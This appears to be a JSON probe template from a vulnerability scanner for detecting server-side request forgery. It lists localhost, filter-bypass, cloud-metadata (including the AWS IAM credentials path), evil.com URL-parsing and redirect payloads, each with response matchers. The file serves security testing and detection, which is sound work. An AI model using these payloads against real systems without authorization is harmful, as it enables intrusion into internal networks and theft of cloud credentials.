{
  "category": "ssrf",
  "contexts": {
    "internal": {
      "description": "SSRF probes targeting internal network resources and localhost services",
      "tech_match": [],
      "param_match": ["url", "uri", "path", "dest", "redirect", "site", "html", "feed", "to", "out", "callback", "domain", "rurl", "return"],
      "probes": [
        {
          "payload": "http://127.0.0.1/",
          "description": "SSRF to localhost root \u2014 length diff indicates internal content served",
          "matchers": [
            {"type": "length_diff", "min_diff": 100}
          ],
          "severity": "high",
          "confidence_boost": 40,
          "variables": {}
        },
        {
          "payload": "http://127.0.0.1:22/",
          "description": "SSRF to localhost SSH port \u2014 SSH banner in response confirms internal reach",
          "matchers": [
            {"type": "word", "words": ["ssh", "refused", "OpenSSH"], "condition": "or"}
          ],
          "severity": "high",
          "confidence_boost": 65,
          "variables": {}
        },
        {
          "payload": "http://127.0.0.1:6379/",
          "description": "SSRF to localhost Redis \u2014 Redis error banner confirms internal reach",
          "matchers": [
            {"type": "word", "words": ["-ERR", "NOAUTH", "redis"], "condition": "or"}
          ],
          "severity": "critical",
          "confidence_boost": 75,
          "variables": {}
        },
        {
          "payload": "http://0.0.0.0/",
          "description": "SSRF via 0.0.0.0 alias for localhost bypass",
          "matchers": [
            {"type": "length_diff", "min_diff": 100}
          ],
          "severity": "high",
          "confidence_boost": 35,
          "variables": {}
        },
        {
          "payload": "{{callback}}",
          "description": "Out-of-band SSRF detection via collaborator callback URL",
          "matchers": [
            {"type": "length_diff", "min_diff": 0}
          ],
          "severity": "high",
          "confidence_boost": 50,
          "variables": {}
        }
      ]
    },
    "localhost_bypass": {
      "description": "SSRF localhost bypass probes \u2014 alternative IP representations that resolve to 127.0.0.1 but evade string-based blocklists",
      "tech_match": [],
      "param_match": ["url", "uri", "path", "dest", "redirect", "site", "html", "feed", "to", "out", "callback", "domain", "rurl", "return"],
      "probes": [
        {
          "payload": "http://127.1/",
          "description": "Shortened localhost IP \u2014 127.1 resolves to 127.0.0.1 on most systems, bypasses full-quad filters",
          "matchers": [
            {"type": "length_diff", "min_diff": 100},
            {"type": "not_word", "words": ["blocked", "not allowed", "invalid url", "denied"]}
          ],
          "severity": "high",
          "confidence_boost": 50,
          "variables": {}
        },
        {
          "payload": "http://0177.0.0.1/",
          "description": "Octal notation for 127.0.0.1 \u2014 0177 = 127 in octal; many URL parsers resolve this to localhost",
          "matchers": [
            {"type": "length_diff", "min_diff": 100},
            {"type": "not_word", "words": ["blocked", "not allowed", "invalid url", "denied"]}
          ],
          "severity": "high",
          "confidence_boost": 55,
          "variables": {}
        },
        {
          "payload": "http://0x7f.0.0.1/",
          "description": "Hex notation for 127.0.0.1 \u2014 0x7f = 127 in hex; bypasses decimal IP blocklists",
          "matchers": [
            {"type": "length_diff", "min_diff": 100},
            {"type": "not_word", "words": ["blocked", "not allowed", "invalid url", "denied"]}
          ],
          "severity": "high",
          "confidence_boost": 55,
          "variables": {}
        },
        {
          "payload": "http://2130706433/",
          "description": "Decimal integer notation for 127.0.0.1 \u2014 2130706433 = 0x7F000001; evades dotted-quad filters entirely",
          "matchers": [
            {"type": "length_diff", "min_diff": 100},
            {"type": "not_word", "words": ["blocked", "not allowed", "invalid url", "denied"]}
          ],
          "severity": "high",
          "confidence_boost": 55,
          "variables": {}
        },
        {
          "payload": "http://[::1]/",
          "description": "IPv6 loopback address \u2014 canonical localhost in IPv6, bypasses IPv4-only blocklists",
          "matchers": [
            {"type": "length_diff", "min_diff": 100},
            {"type": "not_word", "words": ["blocked", "not allowed", "invalid url", "denied"]}
          ],
          "severity": "high",
          "confidence_boost": 55,
          "variables": {}
        },
        {
          "payload": "http://0/",
          "description": "Zero IP \u2014 resolves to 0.0.0.0 which maps to localhost on many systems",
          "matchers": [
            {"type": "length_diff", "min_diff": 100},
            {"type": "not_word", "words": ["blocked", "not allowed", "invalid url", "denied"]}
          ],
          "severity": "high",
          "confidence_boost": 45,
          "variables": {}
        }
      ]
    },
    "cloud_metadata": {
      "description": "SSRF probes targeting cloud provider metadata endpoints (AWS, GCP, Azure, DigitalOcean, Oracle, Alibaba)",
      "tech_match": ["AWS", "GCP", "Azure"],
      "param_match": ["url", "uri", "path", "dest", "redirect", "site", "html", "feed", "to", "out", "callback", "domain", "rurl", "return"],
      "probes": [
        {
          "payload": "http://169.254.169.254/latest/meta-data/",
          "description": "AWS IMDSv1 metadata endpoint \u2014 ami-id or instance-id confirms SSRF to AWS metadata",
          "matchers": [
            {"type": "word", "words": ["ami-id", "instance-id", "iam"], "condition": "or"}
          ],
          "severity": "critical",
          "confidence_boost": 90,
          "variables": {}
        },
        {
          "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
          "description": "AWS IAM credentials endpoint \u2014 role name in response reveals attached IAM role",
          "matchers": [
            {"type": "regex", "pattern": "[A-Za-z0-9_-]{1,64}"}
          ],
          "severity": "critical",
          "confidence_boost": 85,
          "variables": {}
        },
        {
          "payload": "http://metadata.google.internal/computeMetadata/v1/",
          "description": "GCP metadata endpoint \u2014 requires Metadata-Flavor header bypass",
          "matchers": [
            {"type": "word", "words": ["instance", "project"], "condition": "or"}
          ],
          "severity": "critical",
          "confidence_boost": 80,
          "variables": {}
        },
        {
          "payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
          "description": "Azure IMDS endpoint \u2014 compute details confirm Azure SSRF",
          "matchers": [
            {"type": "word", "words": ["subscriptionId", "resourceGroupName", "vmId"], "condition": "or"}
          ],
          "severity": "critical",
          "confidence_boost": 85,
          "variables": {}
        },
        {
          "payload": "http://169.254.169.254/metadata/v1.json",
          "description": "DigitalOcean metadata endpoint \u2014 droplet_id or region in response confirms SSRF to DO metadata",
          "matchers": [
            {"type": "word", "words": ["droplet_id", "region", "interfaces", "floating_ip"], "condition": "or"}
          ],
          "severity": "critical",
          "confidence_boost": 85,
          "variables": {}
        },
        {
          "payload": "http://169.254.169.254/opc/v1/instance/",
          "description": "Oracle Cloud IMDS endpoint \u2014 compartmentId or shape in response confirms SSRF to OCI metadata",
          "matchers": [
            {"type": "word", "words": ["compartmentId", "shape", "availabilityDomain", "ocid1"], "condition": "or"}
          ],
          "severity": "critical",
          "confidence_boost": 85,
          "variables": {}
        },
        {
          "payload": "http://100.100.100.200/latest/meta-data/",
          "description": "Alibaba Cloud ECS metadata endpoint \u2014 instance-id or region-id confirms SSRF to Alibaba Cloud metadata",
          "matchers": [
            {"type": "word", "words": ["instance-id", "region-id", "zone-id", "image-id"], "condition": "or"}
          ],
          "severity": "critical",
          "confidence_boost": 85,
          "variables": {}
        }
      ]
    },
    "ipv6_bypass": {
      "description": "SSRF bypass using IPv6 representations of localhost \u2014 evades blocklists checking for 127.0.0.1 in string form",
      "tech_match": [],
      "param_match": ["url", "uri", "path", "dest", "redirect", "site", "html", "feed", "to", "out", "callback", "domain", "rurl", "return"],
      "probes": [
        {
          "payload": "http://[::ffff:127.0.0.1]/",
          "description": "IPv4-mapped IPv6 address for localhost \u2014 bypasses simple string match on 127.0.0.1",
          "matchers": [
            {"type": "length_diff", "min_diff": 100}
          ],
          "severity": "high",
          "confidence_boost": 50,
          "variables": {}
        },
        {
          "payload": "http://[0:0:0:0:0:ffff:127.0.0.1]/",
          "description": "Full-form IPv4-mapped IPv6 localhost \u2014 alternative notation evading short-form filters",
          "matchers": [
            {"type": "length_diff", "min_diff": 100}
          ],
          "severity": "high",
          "confidence_boost": 50,
          "variables": {}
        },
        {
          "payload": "http://[::1]/",
          "description": "IPv6 loopback address (::1) \u2014 canonical localhost in IPv6, bypasses IPv4-only blocklists",
          "matchers": [
            {"type": "length_diff", "min_diff": 100}
          ],
          "severity": "high",
          "confidence_boost": 55,
          "variables": {}
        }
      ]
    },
    "url_bypass": {
      "description": "SSRF filter bypass via URL parsing ambiguities \u2014 at-sign, fragment, shortened IP, zero IP, backslash tricks from HackTricks",
      "tech_match": [],
      "param_match": ["url", "uri", "path", "dest", "redirect", "site", "html", "feed", "to", "out", "callback", "domain", "rurl", "return"],
      "probes": [
        {
          "payload": "http://127.0.0.1@evil.com/",
          "description": "At-sign URL parsing trick \u2014 some parsers use evil.com as host while fetchers use 127.0.0.1 as auth host",
          "matchers": [
            {"type": "length_diff", "min_diff": 100}
          ],
          "severity": "high",
          "confidence_boost": 45,
          "variables": {}
        },
        {
          "payload": "http://evil.com#@127.0.0.1/",
          "description": "Fragment bypass \u2014 some validators stop at # treating 127.0.0.1 as fragment, fetcher uses it as host",
          "matchers": [
            {"type": "length_diff", "min_diff": 100}
          ],
          "severity": "high",
          "confidence_boost": 40,
          "variables": {}
        },
        {
          "payload": "http://127.1/",
          "description": "Shortened localhost IP \u2014 127.1 resolves to 127.0.0.1 on most systems, bypasses full-quad filters",
          "matchers": [
            {"type": "length_diff", "min_diff": 100}
          ],
          "severity": "high",
          "confidence_boost": 50,
          "variables": {}
        },
        {
          "payload": "http://0/",
          "description": "Zero IP \u2014 resolves to 0.0.0.0 which maps to localhost on many systems",
          "matchers": [
            {"type": "length_diff", "min_diff": 100}
          ],
          "severity": "high",
          "confidence_boost": 45,
          "variables": {}
        },
        {
          "payload": "http://127.0.0.1:80\\@evil.com/",
          "description": "Backslash before @ trick \u2014 some URL parsers treat backslash as path separator, others as authority delimiter",
          "matchers": [
            {"type": "length_diff", "min_diff": 100}
          ],
          "severity": "high",
          "confidence_boost": 40,
          "variables": {}
        }
      ]
    },
    "redirect_based": {
      "description": "SSRF via open redirect chains \u2014 server fetches a URL that redirects to an internal resource",
      "tech_match": [],
      "param_match": ["url", "uri", "path", "dest", "redirect", "site", "html", "feed", "to", "out", "callback", "domain", "rurl", "return"],
      "probes": [
        {
          "payload": "https://{{callback}}/redirect?url=http://169.254.169.254/",
          "description": "SSRF via open redirect \u2014 server-side fetch follows redirect to cloud metadata endpoint; check collaborator for interaction",
          "matchers": [
            {"type": "length_diff", "min_diff": 0}
          ],
          "severity": "high",
          "confidence_boost": 55,
          "variables": {}
        },
        {
          "payload": "http://169.254.169.254/latest/meta-data/hostname",
          "description": "AWS EC2 hostname metadata \u2014 short string response is high-confidence SSRF confirmation",
          "matchers": [
            {"type": "regex", "pattern": "ip-[0-9]+-[0-9]+-[0-9]+-[0-9]+"}
          ],
          "severity": "critical",
          "confidence_boost": 90,
          "variables": {}
        }
      ]
    }
  }
}
